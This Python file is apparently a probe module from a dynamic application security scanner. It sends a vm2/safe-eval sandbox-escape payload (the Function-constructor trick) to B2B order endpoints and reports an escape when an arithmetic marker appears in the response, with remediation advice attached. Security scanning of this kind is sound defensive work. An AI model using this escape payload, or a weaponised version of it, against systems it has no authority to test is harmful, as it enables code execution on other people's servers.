#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Deserialization: vm2 / safe-eval sandbox-escape via Function constructor.

The companion probe `deserialization_b2b_eval` confirms that the B2B
endpoint evaluates JavaScript at all. Some apps respond to that
finding by switching to vm2 / `safe-eval` / `sandbox` — interpreters
that purport to evaluate untrusted JS safely. The standard escape
technique uses `this.constructor.constructor("return ...")()` — the
Function constructor — to re-enter the global scope.

Detection signal:
  POST /b2b/v2/orders with `orderLinesData =
  "this.constructor.constructor('return 7*191')()"`
  → response body contains `1337`.

If the eval probe fires AND this probe fires, the app's "fix" of
switching to a sandbox library is itself broken — common pattern.

Tested against:
  + OWASP Juice Shop  current build evaluates this form too →
                      validated=True (when reachable).
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

B2B_PATHS = (
    "/b2b/v2/orders",
    "/api/b2b/orders",
    "/b2b/orders",
)

# `this.constructor.constructor` is the Function constructor when
# evaluated inside a vm2-style sandbox, because `this` is a wrapper
# object. Calling Function(returnSomething)() escapes the sandbox to
# the global VM. Pure arithmetic only — same safety profile as the
# eval probe.
PROBE_PAYLOAD = "this.constructor.constructor('return 7*191')()"
PROBE_RESULT  = "1337"


class DeserializationSandboxEscapeProbe(Probe):
    name = "deserialization_b2b_sandbox_escape"
    summary = ("Detects vm2 / safe-eval sandbox escape on B2B endpoints "
               "via the Function-constructor reach-out.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--path", action="append", default=[],
            help="Additional B2B-style endpoint to test (repeatable).")
        # NB: --cookie is provided by the base parser; do not re-add.

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(B2B_PATHS) + list(args.path or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        body = json.dumps({"orderLinesData": PROBE_PAYLOAD}).encode()
        for p in paths:
            url = urljoin(origin, p)
            r = client.request("POST", url, headers={
                "Content-Type": "application/json",
            }, body=body)
            row: dict = {"path": p, "status": r.status, "size": r.size}
            if r.body and PROBE_RESULT in r.text:
                row["sandbox_escape_succeeded"] = True
                idx = r.text.index(PROBE_RESULT)
                row["snippet"] = r.text[max(0, idx-80):idx+80]
                confirmed = row
                attempts.append(row)
                break
            attempts.append(row)

        evidence = {"origin": origin, "payload": PROBE_PAYLOAD,
                    "expected_marker": PROBE_RESULT,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: vm2 / safe-eval sandbox escape on "
                         f"{origin}{confirmed['path']}. The Function-"
                         f"constructor payload evaluated to {PROBE_RESULT} "
                         "— the sandbox is not a security boundary."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Stop relying on a JS sandbox library to safely "
                    "execute untrusted input. The Node ecosystem has "
                    "a long history of escapes: vm2 (CVE-2023-29017), "
                    "safe-eval, sandbox — all proven escapable.\n"
                    "Replace with a structured DSL parser: a hand-"
                    "written arithmetic evaluator, `expr-eval`, or a "
                    "JSON-shape rule language. If JavaScript really is "
                    "required, run the evaluator in a separate process "
                    "with seccomp/AppArmor confinement and treat any "
                    "output as untrusted."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: {len(attempts)} sandbox-escape attempts "
                     f"on {origin}; no response contained {PROBE_RESULT}."),
            evidence=evidence,
        )


if __name__ == "__main__":
    DeserializationSandboxEscapeProbe().main()
